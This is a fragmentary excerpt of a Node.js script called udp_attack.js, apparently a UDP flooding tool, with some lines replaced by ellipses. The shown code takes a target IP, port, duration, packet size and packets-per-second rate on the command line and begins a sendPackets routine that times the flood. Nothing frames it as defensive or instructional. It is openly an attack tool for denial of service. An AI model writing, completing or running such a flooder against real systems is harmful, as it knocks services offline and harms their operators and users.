...
if (process.argv.length <= 6) {
    console.log("Usage: node udp_attack.js [TARGET_IP] [TARGET_PORT] [DURATION] [PACKET_SIZE] [RATE]");
    process.exit(-1);
}
...
const rate = parseInt(process.argv[6]); // Packets per second
...
function sendPackets() {
    ...
    const interval = 1000 / rate; // Interval in milliseconds
